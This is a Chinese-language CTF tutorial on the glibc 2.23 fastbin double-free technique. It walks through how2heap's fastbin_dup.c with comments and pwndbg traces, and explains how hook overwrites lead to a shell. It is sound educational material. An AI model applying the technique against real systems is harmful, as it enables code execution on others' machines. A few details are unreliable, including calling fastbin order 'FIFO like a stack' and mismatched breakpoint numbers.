# Fastbin Attack

**本篇是基于github上面how2heap项目撰写的**

### fastbin double free 
* **什么是double free** 
也就是一个堆块在已经释放过一次的前提下，再次被错误的释放
* **为什么double free可以被利用**
首先我们来看一下linux中堆块释放的机制：
因为在Linux的堆管理器ptmalloc2上，被释放的堆块都会依据其大小放置在对应的链表（我们称之为bins）上面。
fastbin是其中一种链表的数组，他总共有从存放`2*SIZE_SZ`大小的堆块的链表到`20*SIZE_SZ`大小的堆块(这里说的都是用户可以使用的空间大小，即数据空间大小)，总共有10个bins。
每个链表都是一个单链表，当堆块被释放时并且其大小符合fastbins里某一个bin的大小，则该堆块的指针会被放到对应fastbin的头节点的next指针上面，当前堆块的next指针（用户区的第一个SIZE_SZ字节）指向原来头节点next指针指向的位置。
如果我们可以double free，则会导致对应堆块的指针在这条单链表上面出现两次。
接下来，我们先把这个堆块chunk1分配回来，把我们可以任意写的用户区的第一个SIZE_SZ大小字节改成我们想要利用的地址（比如`__malloc_hook` `__free_hook`之前的某个地址）
我们再接着malloc同样大小的堆块，直到这个fastbin的头节点next指针再次指向这个chunk1，这时如果我们再次malloc，chunk1会被分配回来，那他的**next所指向的地址所属的，与当前fastbin大小一致的一段连续空间**，会变成**fastbin的头节点的next指向的位置**，也就是说，**chunk1的next指向的区域**，被当做了**下一次malloc同样大小堆块时要被分配到“堆块”**。
但是我们再返回来看，发现这个next被我们在第一次malloc拿到chunk1的时候已经改成一个target地址了，那我们第二次再拿到这个chunk1的时候，这个指向target地址的指针，便成了当前大小fastbin头节点next指针的值。
我们顺水推舟，再malloc一次同样的大小，顺利就拿到了target地址所在的这片空间，理论上来说你所能控制大小与你的chunk1大小一致，但是实际上没有人能管你到底会怎么“祸害”这片空间了。地址已经被你拿到，原本不可写的数据或者代码段被你这一系列操作变成了系统认为的堆块，现在你就可以任意写这片区域了（比如把`__malloc_hook` `__free_hook`改成`system()`,这样就可以getshell了）

* **上面只是理论，ctf还需要实践，那下面让我们用how2heap上面的一个例子来看看最简单的double free是什么样的吧**
```c
// https://github.com/shellphish/how2heap/glibc-2.23/fastbin_dup.c

/*
下面这是在Linux glibc2.23版本下，展示fastbin double free机制的一个程序，源代码路径我已经标在上面了,大家有兴趣可以clone下来自己去编译运行看看。当然，我下面也会逐关键行讲解。
*/


#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);
	// 这里malloc了3个8字节大小的堆，但实际上，在64位环境下（我的机器也是最普遍的机器），最低分配字节其实是16个字节，所以分配到的都是用户区域有0x10字节的堆块。

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);
	// 但是这里你看完肯定会疑惑，为什么a与b，b与c之间，相差了0x20的空间呢？这是因为一个堆块chunk不仅有用户可以使用的数据区域，还有存放chunk基本信息的头部区域（head）。
	// head部分占16个字节，其实就是2*SIZE_SZ个字节（64位SIZE_SZ为8字节）。
	// 第一个8字节存放prev_size，即上一个堆块的大小（如果上一个堆块已被释放的话才有效，否则默认可以用作上一个堆块的用户数据区）。
	// 第2个8字节存放size，但是里面还有map、prev_inuse（最后一位）等标志位。
	// 当你在代码里面写下malloc(8)的时候，系统最终给你返回的这个指针，指向的是用户数据区，即chunk真正的首地址+16字节的位置。
	// head的16字节，加上原本的最小用户数据区大小16字节，就构成了最小的chunk大小32字节，也就是你看到的0x20的空间。

	fprintf(stderr, "Freeing the first one...\n");
	free(a);
	// 这里首先free掉a，让他进入对应的fastbin

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);
	// 这里千万不能再次free(a)，因为写linux源码的人也不是傻瓜，他在堆块释放的时候加了检查。在glibc还在2.23版本的时候，这个检查虽然有，但是比较薄弱。他只会检查当前fastbin的头节点next指向的堆块是否与当前要释放的堆块一致。如果是同一个堆块，则说明你想要再次释放已经释放过的堆块，程序就会崩溃。
	// 但是很显然，既然你检查的是头节点的next指针，那只要我头节点的next指针当前指的不是这个a，不就可以再次释放a了吗

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);
	// 所以我们选择先释放b，让next先指到b上面

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);
	// 这时候再回过头来，把a再释放出去，就没有人会阻拦了哈哈哈

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	a = malloc(8);
	b = malloc(8);
	c = malloc(8);
	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);
	// 我们再一个一个malloc回来，看看我们double free真的成功没有。发现a指向的还是a，因为a是最后一遍释放的那个。b指向的还是b，因为b是倒数第二个释放的。c指向的是原来的a，这就说明double free成功了。我们原本的a块在同一个fastbin上面出现了两次，只要中间隔了一个b就实现了。

	assert(a == c); // 断言是成功通过的
	return 0;
}
```

* 如果电脑现在不在你身边或者你的环境还没有配置好，那你可以先看我给你运行一遍：
**注意：下面我说的在哪里打断点指的是how2heap源程序里面的行数，不是上面的行数哈。上面我往里面写了太多注释，行都错位了**
1. 先用gdb调试 `$ gdb -q ./glibc_2.23/fastbin_dup`
2. 在第13行处打断点，看一看刚分配的三个堆块在heap上面的什么地址 
```bash
pwndbg> b 13
Breakpoint 2 at 0x555555555245: file glibc_2.23/fastbin_dup.c, line 14.
pwndbg> c
.....此处省略中间gdb的信息,让他运行到第13行位置......
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000 (这是a对应堆块的真正初始地址)
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x555555559020（这是b对应堆块的真正初始地址）
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x555555559040（这是c对应堆块的真正初始地址）
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x555555559060 （这是主线程剩余未分配堆空间）
Size: 0x20fa0 (with flag bits: 0x20fa1)
```
3. 在第17行打断点，看一下这3个堆块的用户区地址，也就是malloc返回的指针值
```bash
pwndbg> b 17
Breakpoint 3 at 0x5555555552ab: file glibc_2.23/fastbin_dup.c, line 18.
pwndbg> c
Continuing.
1st malloc(8): 0x555555559010 (果真偏移0x10吧)
2nd malloc(8): 0x555555559030
3rd malloc(8): 0x555555559050
```
4. 先释放第一次a，看看fastbin。在第20行打断点,然后用`bins`指令查看当前有被释放堆块的bin状态
```bash
pwndbg> b 20
Breakpoint 4 at 0x5555555552da: file glibc_2.23/fastbin_dup.c, line 21.
pwndbg> c
Continuing.
Freeing the first one...
......
pwndbg> bins
fastbins
0x20: 0x555555559000 ◂— 0  这里可以看到a块被放到这个大小为0x20的fastbin里面了
unsortedbin
empty
smallbins
empty
largebins
empty
```
5. 再释放b，看看fastbin。在26行打断点。
```bash
pwndbg> b 27
Breakpoint 5 at 0x55555555532b: file glibc_2.23/fastbin_dup.c, line 27.
pwndbg> c
Continuing.
If we free 0x555555559010 again, things will crash because 0x555555559010 is at the top of the free list.
So, instead, we'll free 0x555555559030.
......
pwndbg> fastbin
fastbins
0x20: 0x555555559020 —▸ 0x555555559000 ◂— 0 从左向右，是链表增长方向，最左侧是最靠近头节点的位置。也就是说现在b在头节点的next位置上面，a在b的next位置上面
```
6. 再释放a，现在是绕过检查了。在29行打断点。
```bash
pwndbg> b 30
Breakpoint 6 at 0x555555555359: file glibc_2.23/fastbin_dup.c, line 30.
pwndbg> c
Continuing.
Now, we can free 0x555555559010 again, since it's not the head of the free list.
......
pwndbg> fastbin
fastbins
0x20: 0x555555559000 —▸ 0x555555559020 ◂— 0x555555559000 可以发现现在头节点next指针指向的是a了，但是链表末尾还有一个a，这就说明我们的double free构造成功了。接下来就该malloc把他们拿回来进行利用了。
```
7. 把断点打在32和33位置，看看前两个malloc是否是把a和b分配回去（FIFO原则，和栈一样）
```bash
pwndbg> b 32 malloc一次
Breakpoint 7 at 0x555555555398: file glibc_2.23/fastbin_dup.c, line 32.
pwndbg> c
......
pwndbg> fastbin
fastbins
0x20: 0x555555559020 —▸ 0x555555559000 ◂— 0x555555559020 因为a被释放了两次，第二次a被释放进来的时候next指针指向了b，链表上面最右边那个a也就是第一次被释放进来的a的next指针同时被修改成了b，就导致这个fastbin的链表成死循环了，以后malloc只会malloc这两个了，a和b轮流被malloc
pwndbg> heap
Free chunk (fastbins) | PREV_INUSE  相当于还有一个a在fastbin里面呢，所以这里还是显示free chunk
Addr: 0x555555559000
Size: 0x20 (with flag bits: 0x21)  
fd: 0x555555559020

Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555559020
Size: 0x20 (with flag bits: 0x21)
fd: 0x555555559000

Allocated chunk | PREV_INUSE
Addr: 0x555555559040
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x555555559060
Size: 0x20fa0 (with flag bits: 0x20fa1)
```

```bash
pwndbg> b 33  malloc第二次
Breakpoint 8 at 0x5555555553a6: file glibc_2.23/fastbin_dup.c, line 33.
pwndbg> c
......
pwndbg> fastbin
fastbins
0x20: 0x555555559000 —▸ 0x555555559020 ◂— 0x555555559000 a又回到了头上，下次分配就可以拿到a了
pwndbg> heap
Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555559000
Size: 0x20 (with flag bits: 0x21)
fd: 0x555555559020

Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555559020
Size: 0x20 (with flag bits: 0x21)
fd: 0x555555559000

Allocated chunk | PREV_INUSE
Addr: 0x555555559040
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x555555559060
Size: 0x20fa0 (with flag bits: 0x20fa1)
```
8. 再次malloc，成功重复拿到a。这时候a和c都指向曾经的a
```bash
pwndbg> b 37 再次malloc
Breakpoint 9 at 0x55555555541a: file glibc_2.23/fastbin_dup.c, line 38.
pwndbg> c
Continuing.
1st malloc(8): 0x555555559010 这是原本的a
2nd malloc(8): 0x555555559030 这是原本的b
3rd malloc(8): 0x555555559010 这是还是原本的a
......
pwndbg> fastbin
fastbins
0x20: 0x555555559020 —▸ 0x555555559000 ◂— 0x555555559020 b又回到头上了，a和b会轮流回到头上，只要没有新的块进来
pwndbg> heap
Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555559000
Size: 0x20 (with flag bits: 0x21)
fd: 0x555555559020

Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555559020
Size: 0x20 (with flag bits: 0x21)
fd: 0x555555559000

Allocated chunk | PREV_INUSE
Addr: 0x555555559040
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x555555559060
Size: 0x20fa0 (with flag bits: 0x20fa1)
```

* **请注意：fastbin double free机制虽然通用，但是在glibc-2.26版本引入tcache结构体之后，必须先把对应的tcachebin填满才能把堆块释放入fastbin。同样的，再malloc回来时，必须先把tcache里面的块分配完才会轮到fastbin**

